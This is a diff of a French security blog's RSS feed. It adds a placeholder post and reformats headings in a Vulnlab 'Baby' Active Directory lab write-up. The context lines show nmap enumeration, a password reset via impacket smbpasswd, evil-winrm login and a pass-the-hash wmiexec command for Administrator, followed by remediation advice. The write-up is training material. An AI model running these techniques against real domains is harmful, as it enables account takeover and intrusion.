@@ -6,7 +6,30 @@
     <description>Recent content on Blog | Hadrien</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Sat, 06 Apr 2024 22:19:21 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 18 Nov 2024 14:27:14 +0100</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>📦 Machine Delegate - Vulnlab (En cours de rédaction)</title>
+      <link>/posts/2/</link>
+      <pubDate>Mon, 18 Nov 2024 14:27:14 +0100</pubDate>
+      
+      <guid>/posts/2/</guid>
+      <description>&lt;p&gt;A travers cet article, nous allons voir comment passer administrateur d&amp;rsquo;une machine proposée par &lt;a href=&#34;https://www.vulnlab.com&#34;&gt;Vulnlab&lt;/a&gt; &amp;ldquo;Delegate&amp;rdquo; !&lt;/p&gt;
+&lt;h2 id=&#34;-énumération&#34;&gt;🔍 Énumération&lt;/h2&gt;
+&lt;h2 id=&#34;-exploitation&#34;&gt;🤯 Exploitation&lt;/h2&gt;
+&lt;h2 id=&#34;-élévation-de-privilège&#34;&gt;🔼 Élévation de privilège&lt;/h2&gt;
+&lt;h2 id=&#34;-proposition-de-remédiation&#34;&gt;🩹 Proposition de remédiation&lt;/h2&gt;
+&lt;h2 id=&#34;-documentations&#34;&gt;📚 Documentations&lt;/h2&gt;
+&lt;h2 id=&#34;-outils&#34;&gt;🧰 Outils&lt;/h2&gt;</description>
+      <content>&lt;p&gt;A travers cet article, nous allons voir comment passer administrateur d&amp;rsquo;une machine proposée par &lt;a href=&#34;https://www.vulnlab.com&#34;&gt;Vulnlab&lt;/a&gt; &amp;ldquo;Delegate&amp;rdquo; !&lt;/p&gt;
+&lt;h2 id=&#34;-énumération&#34;&gt;🔍 Énumération&lt;/h2&gt;
+&lt;h2 id=&#34;-exploitation&#34;&gt;🤯 Exploitation&lt;/h2&gt;
+&lt;h2 id=&#34;-élévation-de-privilège&#34;&gt;🔼 Élévation de privilège&lt;/h2&gt;
+&lt;h2 id=&#34;-proposition-de-remédiation&#34;&gt;🩹 Proposition de remédiation&lt;/h2&gt;
+&lt;h2 id=&#34;-documentations&#34;&gt;📚 Documentations&lt;/h2&gt;
+&lt;h2 id=&#34;-outils&#34;&gt;🧰 Outils&lt;/h2&gt;
+</content>
+    </item>
+    
     <item>
       <title>📦 Machine Baby - Vulnlab</title>
       <link>/posts/1/</link>
@@ -14,7 +37,7 @@
       
       <guid>/posts/1/</guid>
       <description>&lt;p&gt;A travers cet article, nous allons voir comment passer administrateur d&amp;rsquo;une machine proposée par &lt;a href=&#34;https://www.vulnlab.com&#34;&gt;Vulnlab&lt;/a&gt; &amp;ldquo;Baby&amp;rdquo;.&lt;/p&gt;
-&lt;h1 id=&#34;-énumération&#34;&gt;🔍 Énumération&lt;/h1&gt;
+&lt;h2 id=&#34;-énumération&#34;&gt;🔍 Énumération&lt;/h2&gt;
 &lt;p&gt;La découverte de port s&amp;rsquo;effectue avec nmap : &lt;code&gt;nmap IP -sCV -T4&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PORT&lt;/span&gt;     &lt;span style=&#34;color:#a6e22e&#34;&gt;STATE&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SERVICE&lt;/span&gt;       &lt;span style=&#34;color:#a6e22e&#34;&gt;VERSION&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;tcp&lt;/span&gt;   &lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;domain&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;Simple&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DNS&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Plus&lt;/span&gt;
@@ -55,7 +78,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;Message&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;signing&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;enabled&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;required&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ici nous retrouvons les ports d&amp;rsquo;un domaine contrôleur :&lt;/p&gt;</description>
       <content>&lt;p&gt;A travers cet article, nous allons voir comment passer administrateur d&amp;rsquo;une machine proposée par &lt;a href=&#34;https://www.vulnlab.com&#34;&gt;Vulnlab&lt;/a&gt; &amp;ldquo;Baby&amp;rdquo;.&lt;/p&gt;
-&lt;h1 id=&#34;-énumération&#34;&gt;🔍 Énumération&lt;/h1&gt;
+&lt;h2 id=&#34;-énumération&#34;&gt;🔍 Énumération&lt;/h2&gt;
 &lt;p&gt;La découverte de port s&amp;rsquo;effectue avec nmap : &lt;code&gt;nmap IP -sCV -T4&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PORT&lt;/span&gt;     &lt;span style=&#34;color:#a6e22e&#34;&gt;STATE&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SERVICE&lt;/span&gt;       &lt;span style=&#34;color:#a6e22e&#34;&gt;VERSION&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;tcp&lt;/span&gt;   &lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;domain&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;Simple&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;DNS&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Plus&lt;/span&gt;
@@ -151,7 +174,7 @@
 &lt;p&gt;Le compte est marqué pour indiquer que le mot de passe doit être modifié lors de la prochaine ouverture de session. &lt;a href=&#34;https://learn.microsoft.com/fr-fr/windows/win32/api/subauth/nf-subauth-msv1_0subauthenticationroutineex&#34;&gt;Documentations Microsoft&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;Et bien, Modifons le ! 😼&lt;/p&gt;
-&lt;h1 id=&#34;-exploitation&#34;&gt;🤯 Exploitation&lt;/h1&gt;
+&lt;h2 id=&#34;-exploitation&#34;&gt;🤯 Exploitation&lt;/h2&gt;
 &lt;p&gt;L&amp;rsquo;outil de la suite impacket &lt;code&gt;smbpasswd&lt;/code&gt;, permet de changer les mots de passe d&amp;rsquo;objet AD via MSRPC-SAMR&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;L&amp;rsquo;interface SAMR, utilisée pour accéder aux éléments publics de la base de données SAM (par ex., noms d&amp;rsquo;utilisateur) et forcer les mots de passe des utilisateurs indépendamment de la politique de verrouillage des comptes. &lt;a href=&#34;https://book.hacktricks.xyz/v/fr/network-services-pentesting/135-pentesting-msrpc&#34;&gt;Article de Hacktricks : 135 Pentesting MS-RPC&lt;/a&gt;&lt;/p&gt;
@@ -162,7 +185,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;] &lt;span style=&#34;color:#a6e22e&#34;&gt;Password&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;expired&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;trying&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bind&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;session&lt;/span&gt;.
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;] &lt;span style=&#34;color:#a6e22e&#34;&gt;Password&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;was&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;changed&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;successfully&lt;/span&gt;.
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nous avons donc un compte valide sur le domaine : &lt;code&gt;Caroline.Robinson:123Pentest!!!&lt;/code&gt;&lt;/p&gt;
-&lt;h1 id=&#34;-élévation-de-privilège&#34;&gt;🔼 Élévation de privilège&lt;/h1&gt;
+&lt;h2 id=&#34;-élévation-de-privilège&#34;&gt;🔼 Élévation de privilège&lt;/h2&gt;
 &lt;p&gt;Ici, Caroline.Robinson possède les droits de connexion à distance via WinRM, puisqu&amp;rsquo;elle fait partie du groupe &lt;code&gt;BUILTIN\Remote Management Users&lt;/code&gt;, il est possible de récupérer l&amp;rsquo;information en mappant l&amp;rsquo;AD via bloodhound ou liste les groupes via ldapsearch, netexec etc&amp;hellip;&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;Au moment où j&amp;rsquo;ai réalisé la box, j&amp;rsquo;avais tenté à l&amp;rsquo;aveugle la connexion via winRM mais il est préférable de lister les groupes de l&amp;rsquo;utilisateur avant de tenter la connexion&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;Connexions à distance avec evil-winrm&lt;/p&gt;
@@ -250,7 +273,7 @@
 &lt;p&gt;&lt;img alt=&#34;1&#34; src=&#34;/1/baby-1.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Nous pouvons nous connecter en utilisant le hash NT du compte Administrateur.&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;wmiexec.py -hashes :&amp;quot;Hash NT&amp;quot; &amp;quot;baby.vl&amp;quot;/&amp;quot;Administrator&amp;quot;@&amp;quot;$10.10.112.19&amp;quot;&lt;/code&gt;&lt;/p&gt;
-&lt;h1 id=&#34;-proposition-de-remédiation&#34;&gt;🩹 Proposition de remédiation&lt;/h1&gt;
+&lt;h2 id=&#34;-proposition-de-remédiation&#34;&gt;🩹 Proposition de remédiation&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;Désactiver les nulles sessions&lt;/p&gt;
@@ -262,14 +285,14 @@
 &lt;p&gt;Nettoyer les descriptions des objects AD&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;h1 id=&#34;-documentations&#34;&gt;📚 Documentations&lt;/h1&gt;
+&lt;h2 id=&#34;-documentations&#34;&gt;📚 Documentations&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;Article sur les nulls sessions &lt;a href=&#34;https://www.blumira.com/glossary/null-session/&#34;&gt;https://www.blumira.com/glossary/null-session/&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Explication du message d&amp;rsquo;erreur &lt;code&gt;STATUS_LOGON_FAILURE&lt;/code&gt;: &lt;a href=&#34;https://learn.microsoft.com/fr-fr/windows/win32/api/subauth/nf-subauth-msv1_0subauthenticationroutineex&#34;&gt;https://learn.microsoft.com/fr-fr/windows/win32/api/subauth/nf-subauth-msv1_0subauthenticationroutineex&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Interface MS-RPC : &lt;a href=&#34;https://book.hacktricks.xyz/v/fr/network-services-pentesting/135-pentesting-msrpc&#34;&gt;https://book.hacktricks.xyz/v/fr/network-services-pentesting/135-pentesting-msrpc&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;POC Dump NTDS (Backup Operators, SeBackupPrivilege et SeRestorePrivilege) : &lt;a href=&#34;https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960&#34;&gt;https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h1 id=&#34;-outils&#34;&gt;🧰 Outils&lt;/h1&gt;
+&lt;h2 id=&#34;-outils&#34;&gt;🧰 Outils&lt;/h2&gt;
 &lt;p&gt;&lt;strong&gt;Linux :&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;https://nmap.org/&#34;&gt;nmap&lt;/a&gt;&lt;/li&gt;
